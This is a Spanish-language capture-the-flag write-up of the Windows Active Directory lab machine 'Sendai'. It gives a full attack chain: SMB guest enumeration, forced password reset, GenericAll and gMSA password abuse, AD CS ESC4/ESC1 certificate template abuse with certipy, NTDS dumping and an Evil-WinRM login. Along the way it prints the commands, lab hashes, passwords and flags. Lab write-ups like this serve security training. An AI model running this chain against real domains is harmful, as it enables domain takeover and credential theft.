# Máquina: Sendai

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Enumeración SMB (Guest/Anonymous), Password Reset forzado (`STATUS_PASSWORD_MUST_CHANGE`, `changepasswd.py`), BloodHound Enumeration, GenericAll sobre OU, Membresía de Grupo (`bloodyAD`), ReadGMSAPassword (`mgtsvc$`), AD CS ESC4 a ESC1 Template Abuse (`certipy template`), SID Mapping (`-sid`), Certipy LDAP Shell, Volcado de NTDS, Evil-WinRM

---

![Sendai](assets/Pasted%20image%2020260925221952.png)

> **Nota:** La bandera de usuario de esta máquina se encuentra en un directorio no estándar (`C:\`).

## Fase 1: Reconocimiento y Enumeración

Iniciamos con un escaneo exhaustivo de puertos utilizando Nmap:

```bash
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.66 -oN escaneo
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 22:18:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: 2026-09-25T22:19:56+00:00; -1s from scanner time.
443/tcp  open  ssl/https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: 2026-09-25T22:19:55+00:00; -1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-25T22:19:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-25T22:19:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-25T22:19:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2026-09-24T21:47:46
|_Not valid after:  2027-03-26T21:47:46
| rdp-ntlm-info:
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-25T22:19:36+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-25T22:19:39
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

Al revisar el servicio web en el puerto 80, observamos la página de bienvenida por defecto de IIS:

![Sitio Web IIS](assets/Pasted%20image%2020260925222157.png)

Añadimos `sendai.vl` y `dc.sendai.vl` a nuestro archivo `/etc/hosts` tras identificarlos con NetExec:

```bash
nxc smb 10.129.234.66
```

![NetExec SMB](assets/Pasted%20image%2020260925222444.png)

### Enumeración de Recursos Compartidos SMB

Enumeramos los recursos compartidos disponibles con una sesión nula/invitado:

```bash
nxc smb 10.129.234.66 -u ' ' -p '' --shares
```

![Shares SMB](assets/Pasted%20image%2020260925222726.png)

Identificamos los recursos compartidos `Users` y `sendai`. Rastreamos el contenido de los recursos con el módulo `spider_plus` de NetExec:

```bash
nxc smb 10.129.234.66 -u ' ' -p '' -M spider_plus
```

![Spider Plus](assets/Pasted%20image%2020260925223300.png)

En el reporte generado se identifican varios archivos de interés:
- `sendai/incident.txt`
- `sendai/it/Bginfo64.exe`
- `sendai/it/PsExec64.exe`
- `sendai/security/guidelines.txt`

Nos conectamos con `smbclient` al recurso `Users` y descargamos `desktop.ini`:

```bash
smbclient //10.129.234.66/Users -N
```

![Descarga Users](assets/Pasted%20image%2020260925224930.png)

Luego nos conectamos al recurso `sendai` y descargamos el archivo `incident.txt`:

```bash
smbclient //10.129.234.66/sendai -N
```

![Conexión sendai](assets/Pasted%20image%2020260925225440.png)

![Descarga incident.txt](assets/Pasted%20image%2020260925225608.png)

Examinamos el contenido de `incident.txt`:

![Lectura incident.txt](assets/Pasted%20image%2020260925225704.png)

```text
Estimados empleados:

Esperamos que este mensaje les encuentre bien. Queremos informarles sobre una actualización de seguridad importante relacionada con las contraseñas de las cuentas de usuario. Recientemente, llevamos a cabo una prueba de penetración exhaustiva que reveló que un número significativo de cuentas de usuario utiliza contraseñas débiles e inseguras.

Para abordar esta situación y mantener el máximo nivel de seguridad en nuestra organización, el departamento de TI ha tomado medidas inmediatas. Como medida de precaución, se ha invalidado el acceso de todas las cuentas con contraseñas inseguras. Esto significa que los usuarios afectados deberán cambiar su contraseña la próxima vez que inicien sesión.

Solicitamos a los usuarios afectados que realicen el proceso de restablecimiento de contraseña a la mayor brevedad posible para garantizar la seguridad e integridad de nuestros sistemas. Les recordamos que las contraseñas seguras desempeñan un papel fundamental en la protección de información confidencial y de nuestra red frente a posibles amenazas.

Si necesitan ayuda o tienen alguna pregunta sobre el procedimiento de restablecimiento de contraseña, no duden en ponerse en contacto con el equipo de soporte de TI. Estarán encantados de guiarles a través del proceso y brindarles el apoyo necesario.

Agradecemos su colaboración y compromiso para mantener un entorno seguro para todos. Su vigilancia y el cumplimiento de prácticas de seguridad sólidas contribuyen significativamente a nuestra seguridad colectiva.
```

El comunicado oficial indica claramente que las cuentas con contraseñas débiles fueron forzadas a cambiar de clave en el próximo inicio de sesión. 

Descargamos también las directrices de seguridad de la empresa desde `sendai/security/`:

![Directrices de seguridad](assets/Pasted%20image%2020260925230308.png)

En el recurso `sendai` encontramos además carpetas asociadas a diferentes usuarios:

```bash
smbclient //10.129.234.66/sendai -N
```

![Carpetas de usuarios](assets/Pasted%20image%2020260925231503.png)

Recopilamos los nombres de los usuarios observados en un archivo `user.txt`:
```text
anthony.smith
clifford.davey
elliot.yates
lisa.williams
susan.harper
temp
thomas.powell
```

Probamos autenticación con contraseña vacía para cada usuario:

```bash
nxc smb 10.129.234.66 -u 'user.txt' -p ''
```

![Validación de usuarios](assets/Pasted%20image%2020260925232103.png)

El usuario **`elliot.yates`** responde con el código **`STATUS_PASSWORD_MUST_CHANGE`**. Esto confirma que la cuenta existe, la contraseña anterior era vacía y el sistema requiere forzosamente una nueva clave.

## Acceso Inicial y Pivoting de Dominio

### Cambio de Contraseña Forzado (`changepasswd.py`)

Utilizamos `changepasswd.py` de Impacket para asignarle una nueva contraseña al usuario `elliot.yates`:

```bash
changepasswd.py sendai.vl/elliot.yates@10.129.234.66 -newpass 'NuevaPassword123!'
```

![Cambio de contraseña exitoso](assets/Pasted%20image%2020260925232550.png)

Validamos las nuevas credenciales con NetExec y listamos los recursos compartidos:

```bash
nxc smb 10.129.234.66 -u 'elliot.yates' -p 'NuevaPassword123!' --shares
```

![Shares con elliot.yates](assets/Pasted%20image%2020260925234026.png)

### Recolección de Datos con BloodHound

Recolectamos la información del dominio con `bloodhound-ce-python`:

```bash
bloodhound-ce-python -u 'elliot.yates' -p 'NuevaPassword123!' -d sendai.vl -k -ns 10.129.234.66 -c all --zip --dns-tcp
```

![BloodHound Dump](assets/Pasted%20image%2020260925234652.png)

Al analizar las relaciones en BloodHound descubrimos la siguiente cadena de privilegios:
- `elliot.yates` es miembro del grupo `SUPPORT`.
- El grupo `SUPPORT` posee privilegios **`GenericAll`** sobre la Unidad Organizativa (OU) `ADMSVC`.
- La OU `ADMSVC` contiene el grupo `ADMSVC`.
- El grupo `ADMSVC` posee el permiso **`ReadGMSAPassword`** sobre la cuenta de servicio administrada de grupo (gMSA) **`MGTSVCS`**.

![BloodHound Graph](assets/Pasted%20image%2020260925235140.png)

### Abuso de GenericAll y Extracción de Contraseña gMSA

Aprovechando `GenericAll` sobre la OU, utilizamos `bloodyAD` para añadir a `elliot.yates` como miembro del grupo `ADMSVC`:

```bash
bloodyAD --host dc.sendai.vl -d sendai.vl -u 'elliot.yates' -p 'NuevaPassword123!' add groupMember ADMSVC elliot.yates
```

![Añadir a grupo ADMSVC](assets/Pasted%20image%2020260926003417.png)

Confirmamos la pertenencia al grupo mediante LDAP:

```bash
nxc ldap 10.129.234.66 -u elliot.yates -p 'NuevaPassword123!' --groups ADMSVC
```

![Confirmar grupo](assets/Pasted%20image%2020260926004340.png)

Consultamos el nombre exacto de la cuenta de servicio gMSA:

```bash
nxc ldap 10.129.234.66 -u elliot.yates -p 'NuevaPassword123!' --query "(name=*mgtsvc*)" "sAMAccountName,distinguishedName,objectClass"
```

![Query cuenta gMSA](assets/Pasted%20image%2020260926010317.png)

Volcamos el atributo `msDS-ManagedPassword` de la cuenta `mgtsvc$` utilizando `bloodyAD`:

```bash
bloodyAD --host dc.sendai.vl -d sendai.vl -u elliot.yates -p 'NuevaPassword123!' get object 'mgtsvc$' --attr msDS-ManagedPassword
```

```text
distinguishedName: CN=mgtsvc,CN=Managed Service Accounts,DC=sendai,DC=vl
msDS-ManagedPassword.NT: d36e3c08de9bf815f1ffa8a65cfec1f2
msDS-ManagedPassword.B64ENCODED: rEH3APTtvZ5R/MEmuBC35j1Tox5iCnByvSyRnlHfxl6Wwlm7uNGF6Cg+a51FHn4kjN7r3TtrEqcjmu15Huofse9LRYhkRwe+0E7QaFyufsZgf8eeuXMdvVo74069RWpF38tpw/u6W7pgX9iC/8Ue0SbUYSOANveMYkZpbQjiBBgNF5s5h/BKiPk/QvsZpNlxKWAijFtPupa3TAbAXiVUadjuasRTx2raT9xDJjqhHXgTKWst7DFuEjmI8atUPlb9wF2mfXqmKWdD8mnhYd0KN6JuFJH4/flROaq+XXuQObGW3dhdBFAjYRnh5rAVidWYjj8Cd2A/O4zc6mF12/O57w==
```

Validamos el hash NTLM obtenido de `mgtsvc$` con NetExec:

```bash
nxc smb 10.129.234.66 -u 'mgtsvc$' -H 'd36e3c08de9bf815f1ffa8a65cfec1f2'
```

![Validación gMSA](assets/Pasted%20image%2020260926010653.png)

### Extracción de Credenciales de Clifford Davey

Inspeccionando el sistema encontramos credenciales en texto plano vinculadas al servicio de helpdesk:

![Credenciales helpdesk](assets/Pasted%20image%2020260926011902.png)

```text
helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
```

Probamos las credenciales descubiertas para `clifford.davey`:

```bash
nxc smb 10.129.234.66 -u 'clifford.davey' -p 'RFmoB2WplgE_3p'
```

![Validación clifford.davey](assets/Pasted%20image%2020260926012250.png)

## Escalada de Privilegios: Abuso de AD CS

En BloodHound observamos que `clifford.davey` pertenece al grupo `Cert Publishers` / `CA Operators`:

![BloodHound CA Operator](assets/Pasted%20image%2020260926012358.png)

Buscamos plantillas vulnerables con `certipy`:

```bash
certipy find -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -vulnerable -stdout
```

![Certipy ESC4](assets/Pasted%20image%2020260926013357.png)

Detectamos la vulnerabilidad **ESC4** en la plantilla `SendaiComputer`, lo que nos permite reescribir la configuración de la plantilla para convertirla en vulnerable a **ESC1**:

```bash
certipy template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -template SendaiComputer -save-configuration SendaiComputer_old.json -write-default-configuration
```

![Certipy Template Reconfig](assets/Pasted%20image%2020260926013757.png)

Solicitamos un certificado suplantando al `Administrator`:

```bash
certipy req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -dc-ip 10.129.234.66 -ca sendai-DC-CA -template SendaiComputer -upn administrator@sendai.vl -dcom
```

![Certipy Request](assets/Pasted%20image%2020260926013940.png)

Sin embargo, el KDC devuelve un error debido a que la plantilla original es de tipo equipo y el mapeo estricto de certificados (*Strong Certificate Mapping*) exige el SID del objeto:

![Error Mapeo de Certificado](assets/Pasted%20image%2020260926014042.png)

### Solución: Mapeo Explícito del SID

Obtenemos el `objectSid` exacto de la cuenta `Administrator` mediante consulta LDAP:

```bash
nxc ldap 10.129.234.66 -u 'clifford.davey' -p 'RFmoB2WplgE_3p' --query "(sAMAccountName=administrator)" "objectSid"
```

![Consulta SID Administrator](assets/Pasted%20image%2020260926014205.png)

Volvemos a solicitar el certificado especificando el parámetro `-sid`:

```bash
certipy req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -dc-ip 10.129.234.66 -ca sendai-DC-CA -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500 -dcom
```

![Certificado obtenido con SID](assets/Pasted%20image%2020260926014545.png)

### Autenticación con Certificado y Shell LDAP

Iniciamos una shell LDAP interactiva utilizando el certificado obtenido:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 -ldap-shell
```

![Certipy LDAP Shell](assets/Pasted%20image%2020260926014709.png)

A través de la shell LDAP agregamos al usuario `clifford.davey` al grupo `Administrators`. Con estos privilegios administrativos procedemos a volcar el NTDS:

```bash
nxc smb 10.129.234.66 -u 'clifford.davey' -p 'RFmoB2WplgE_3p' --ntds
```

![Volcado NTDS](assets/Pasted%20image%2020260926015008.png)

Obtenemos el hash NTLM del Administrator:

```text
cfb106feec8b89a3d98e14dcbe8d087a
```

Nos conectamos con Evil-WinRM:

```bash
evil-winrm -i 10.129.234.66 -u 'Administrator' -H 'cfb106feec8b89a3d98e14dcbe8d087a'
```

![Evil-WinRM Root Shell](assets/Pasted%20image%2020260926015148.png)

Capturamos la flag de root:

```text
1bc134a7b4ae19fcc072082026d991cf
```

Y la flag de usuario ubicada en `C:\user.txt`:

![User Flag](assets/Pasted%20image%2020260926020709.png)

![Sendai Completada](assets/Pasted%20image%2020261014234001.png)
